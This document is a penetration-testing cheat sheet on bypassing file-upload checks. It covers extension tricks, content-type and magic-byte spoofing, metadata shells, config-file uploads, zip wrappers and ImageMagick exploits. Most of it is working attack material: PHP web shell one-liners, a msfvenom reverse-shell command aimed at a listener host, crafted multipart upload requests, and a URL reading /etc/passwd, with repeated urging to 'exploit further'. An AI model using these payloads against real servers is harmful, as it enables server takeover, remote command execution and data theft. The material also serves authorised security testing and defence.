# Testing For File-Upload and Exploiting.

![https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp](https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp)

## Base Step

```markdown
1. Browse the site and find each upload functionality.
2. Start with basic test by simply uploading a web shell using Weevely
	`weevely generate <password> <path>`
																	OR
	 Use Msfvenom `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`
3. Try the extension bypasses if that fails
4. Try changing content-type to bypass
5. Try Magic number bypass 
6. Try Polygot or PNG IDAT chunks bypass
7. Finally if successful then upload small POC or exploit further.
```

## Test Case - 1: Blacklisting Bypass.

```markdown
1. Find the upload request and send it to the repeater
2. Now start testing which extension for the file is blacklisted, change the `filename=` Parameter

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. Try all of this extension 

**PHP** → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
**ASP** → asp, .aspx, .cer, .asa
**Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf
**Coldfusion** → .cfm, .cfml, .cfc, .dbm
**Using random capitalization** → .pHp, .pHP5, .PhAr

Find more in PayloadAllThings and https://book.hacktricks.xyz/pentesting-web/file-upload

4. If successful then exploit further, or there might be other type of validation or 
	 check so try other bypass.
```

## Test Case - 2: Whitelisting Bypass

```markdown
1. Find the upload request and send it to the repeater
2. Now start testing which extension for the file is whitelisted, change the `filename=` Parameter

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.jpg"
Content-Type: application/x-php

3. Try all of this extension 

file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html

4. If doesn't works then try to bruteforce using intruder which extension are accepted and try again
5. If successful then exploit further, or there might be other type of validation or 
	 check so try other bypass.
```

## Test Case - 3: Content-type validation

```markdown
1. Find the upload request and send it to the repeater
2. Upload file.php and change the Content-type: application/x-php or Content-Type : application/octet-stream to Content-type: image/png or Content-type: image/gif or Content-type: image/jpg

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. If successful then exploit further, or there might be other type of validation or 
	 check so try other bypass.
```

## Test Case - 4: Content-Length validation

```markdown
1. Find the upload request and send it to the repeater
2. Try all three above bypass first, if they doesn't works then see if file size is been
	 checked. Try all four of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. Try small file payload like 

<?=`$_GET[x]`?>   
<?=‘ls’;   Note : <? work for “short_open_tag=On” in php.ini ( Default=On )

4. Finally the request should look like this. if this worked then try to access this file
	 For Example: http://example.com/compromised_file.php?x=cat%20%2Fetc%2Fpasswd 

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

<?=`$_GET[x]`?>

5. Dont stop here, upload better shell and try to see if you can find something more 
	 critical like DB_.
```

## Test Case - 5: Content Bypass / Using Magic Bytes

```markdown
1. Find the upload request and send it to the repeater
2. Try all Four above bypass first, if they doesn't works then see if file content is been
	 checked. Try all five of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. Change the Content-Type: application/x-php to Content-Type: image/gif and Add the 
	 text "GIF89a;" before you shell-code.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>

4. Try more from here https://en.wikipedia.org/wiki/List_of_file_signatures and change 
	 Content-Type: accordingly
5. If successful upload better Shell and POC, and see how can you increase critically.
```

## Test Case - 6: Magic Bytes and Metadata Shell

```markdown
1. Find the upload request and send it to the repeater
2. Try all above bypass first, if they doesn't works then see if file content is been
	 checked. Try all six of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

4. First Bypass Content-Type checks by setting the value of the 
	 Content-Type header to: image/png , text/plain , application/octet-stream
5. Introduce the shell inside the metadata using tool exiftool.

exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

6. Now try uploading this modified img.jpg
7. Exploit further to increase critically.
```

## Test Case - 7: Uploading Configuration Files

```markdown
1. Find the upload request and send it to the repeater
2. Now try to upload .htaccess file if the app is using php server or else
	 try to upload .config is app is using ASP server
3. If you can upload a .htaccess, then you can configure several things and 
	 even execute code (configuring that files with extension .htaccess can be executed).
	 Different .htaccess shells can be found here: https://github.com/wireghoul/htshells
																	OR
	 If you can upload .config files and use them to execute code. One way to do it 
	 is appending the code at the end of the file inside an HTML comment: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config
	 More information and techniques to exploit this vulnerability here: https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
4. Try to exploit now that server config is changed upload the shell 
	 For example if you uploaded .htaccess file with 
	 AddType application/x-httpd-php .png in content this configuration would instruct 
	 the Apache HTTP Server to execute PNG images as though they were PHP scripts.
5. Now simply upload our php shell file with extension .png 
6. Done, try to exploit further.
```

## Test Case - 8: Try Zip Slip Upload

```markdown
1. Find the upload request and send it to the repeater
2. Now check if .zip file is allowed to upload 
3. If a site accepts .zip file, upload .php and compress it into .zip and upload it.
4. Now visit, site.com/path?page=zip://path/file.zip%23rce.php

If you also try this tool and info here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip
```

## Test Case -9 : Try ImageMagick

```markdown
Check Reference : https://hackerone.com/reports/302885 , https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e
1. Find the upload functionality like profile pic upload.
2. Git clone https://github.com/neex/gifoeb in you system.
3. Goto gifoeb directory and run this command.

./gifoeb gen 512x512 dump.gif

   This will create exploitable dump.gif file where 512x512 is pixel dimension and 
	 dump.gif is an gif file.

   You can also try to bypass some checks.

	 a) ./gifoeb gen 1123x987 dump.jpg
	 b) ./gifoeb gen 1123x987 dump.png
	 c) ./gifoeb gen 1123x987 dump.bmp
	 d) ./gifoeb gen 1123x987 dump.tiff
	 e) ./gifoeb gen 1123x987 dump.tif

	(It will create the dump files with different extensions. Try with which site works)
4. After creation of exploitable files, just upload in the profile settings. 
	 using modified Image files.
5. Server will return different pixel files. Download this file.
6. Save and recover the pixel files.
	 
	for p in previews/*; do
    ./gifoeb recover $p | strings;
	done

7. More details here https://github.com/neex/gifoeb

########################### Another Different method #############################

Reference : https://www.exploit-db.com/exploits/39767 , https://hackerone.com/reports/135072

1. Find Upload functionality.
2. Make a file with .mvg extension and add below code in it.

push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context

Here example.com can be your burp collab url or your site were you can receive HTTP request.
3. Now use below command 

convert ssrf.mvg out.png

4. Upload the image and see if you received http request.

Find ready made and more payloads here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik
```
